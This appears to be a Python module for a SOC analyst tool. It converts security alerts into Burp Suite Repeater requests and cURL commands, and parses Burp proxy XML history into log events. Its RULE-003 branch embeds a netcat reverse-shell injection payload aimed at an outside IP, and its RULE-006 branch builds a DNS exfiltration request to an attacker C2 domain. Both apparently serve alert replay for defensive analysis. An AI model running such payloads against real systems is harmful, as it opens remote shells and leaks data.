import xml.etree.ElementTree as ET
import base64
import uuid
import datetime
from typing import Dict, Any, List
from generator.models import LogEvent, LogType

class BurpIntegrator:
    """
    Burp Suite Integration Module for SOC Analyst Workstation.
    - Parses Burp Suite HTTP history XML/JSON items.
    - Generates Burp Suite Repeater raw requests and cURL commands.
    """

    @staticmethod
    def export_burp_repeater(alert_dict: Dict[str, Any]) -> Dict[str, str]:
        """
        Converts a security alert into a Burp Suite Repeater raw HTTP request and cURL command.
        """
        rule_id = alert_dict.get("rule_id", "")
        hostname = alert_dict.get("hostname", "target-host")
        sample_logs = alert_dict.get("sample_raw_logs", [])
        log_sample = sample_logs[0] if sample_logs else ""

        if rule_id == "RULE-003":
            method = "POST"
            path = "/upload.php?cmd=nc+185.220.101.5+4444+-e+/bin/sh"
            host = f"{hostname}.local"
            body = "cmd=nc+185.220.101.5+4444+-e+/bin/sh"
            headers = [
                f"Host: {host}",
                "User-Agent: Mozilla/5.0 (BurpSuite/2026.1; Intruder)",
                "Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {len(body)}"
            ]
        elif rule_id == "RULE-006":
            method = "GET"
            path = "/dns-query?name=stage1.exfil.c2.attacker.com&type=TXT"
            host = f"{hostname}.local"
            body = ""
            headers = [
                f"Host: {host}",
                "User-Agent: BurpSuite/2026.1",
                "Accept: application/dns-json"
            ]
        else:
            method = "POST"
            path = "/api/v1/telemetry"
            host = f"{hostname}.local"
            body = f'{{"alert_id": "{alert_dict.get("alert_id")}", "rule_id": "{rule_id}"}}'
            headers = [
                f"Host: {host}",
                "User-Agent: BurpSuite/2026.1",
                "Content-Type: application/json",
                f"Content-Length: {len(body)}"
            ]

        raw_repeater_req = f"{method} {path} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n" + body
        
        headers_curl = " ".join([f'-H "{h}"' for h in headers])
        data_curl = f'--data "{body}"' if body else ''
        curl_command = f"curl -X {method} http://{host}{path} {headers_curl} {data_curl}".strip()

        return {
            "rule_id": rule_id,
            "raw_http_request": raw_repeater_req,
            "curl_command": curl_command,
            "burp_target_host": host,
            "burp_method": method,
            "burp_path": path
        }

    @staticmethod
    def parse_burp_xml_logs(xml_str: str) -> List[LogEvent]:
        """
        Parses Burp Suite XML proxy history items (<items><item>...) and converts them to LogEvent objects.
        """
        events = []
        try:
            root = ET.fromstring(xml_str)
            items = root.findall(".//item") if root.tag != "item" else [root]
            now_iso = datetime.datetime.utcnow().isoformat() + "Z"

            for item in items:
                url = item.findtext("url", "http://target.local/")
                host = item.findtext("host", "target-host")
                method = item.findtext("method", "GET")
                status = item.findtext("status", "200")
                path = item.findtext("path", "/")

                req_elem = item.find("request")
                raw_req = ""
                if req_elem is not None:
                    if req_elem.get("base64") == "true" and req_elem.text:
                        try:
                            raw_req = base64.b64decode(req_elem.text).decode("utf-8", errors="ignore")
                        except Exception:
                            raw_req = req_elem.text
                    elif req_elem.text:
                        raw_req = req_elem.text

                raw_msg = f'BurpSuite Proxy: {method} {url} HTTP/1.1 - Status {status} - Raw: {raw_req[:120]}'

                evt = LogEvent(
                    id=str(uuid.uuid4()),
                    timestamp=now_iso,
                    log_type=LogType.WEB_ACCESS,
                    hostname=host,
                    source_ip="127.0.0.1",
                    user="burp_proxy_user",
                    process_name="burpsuite",
                    event_id="WEB_BURP_PROXY_ITEM",
                    raw_message=raw_msg,
                    details={
                        "http_method": method,
                        "url": url,
                        "status_code": int(status) if status.isdigit() else 200,
                        "path": path,
                        "raw_request": raw_req
                    }
                )
                events.append(evt)
        except Exception as e:
            print(f"[BurpIntegrator Error] Failed to parse Burp XML: {e}")

        return events
